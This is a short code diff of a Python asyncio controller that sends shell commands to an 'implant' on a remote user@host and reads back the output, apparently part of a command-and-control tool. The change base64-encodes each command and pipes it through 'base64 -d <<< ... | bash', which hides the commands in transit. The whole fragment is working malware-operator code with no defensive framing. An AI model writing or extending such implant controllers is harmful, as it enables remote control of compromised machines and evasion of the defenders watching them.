@@ -4,6 +4,7 @@ from asyncio import *
 from uuid import *
 from aiofiles import * 
 import datetime
+import base64
 sesje = {}
 
 async def run_cmd(reader, writer, command, host, user):
@@ -13,16 +14,19 @@ async def run_cmd(reader, writer, command, host, user):
          reader._buffer.clear()
         else:
             break
+    command = "( "+ command.strip()
+    command2 = f" && echo -n {granica})"
+    command = base64.standard_b64encode(((command+command2).encode()))
+    full = "base64 -d <<< ".encode() + command + " | bash\n".encode()
 
-    command = "( "+ command
-    command2 = f"&& echo -n {granica})\n"
-    writer.write((command+command2).encode())
+    print (f"full to {full.decode()}")
+    writer.write(full)
     await writer.drain()
     await sleep(0.1)
 
     odp = b""
     while granica.encode() not in odp:
-        try:
+        try: 
             chunk = await wait_for(reader.read(4096),timeout=5)
             if not chunk:
                 raise ConnectionError(f"[-]problem z połączeniem z implantem {user}@{host}")
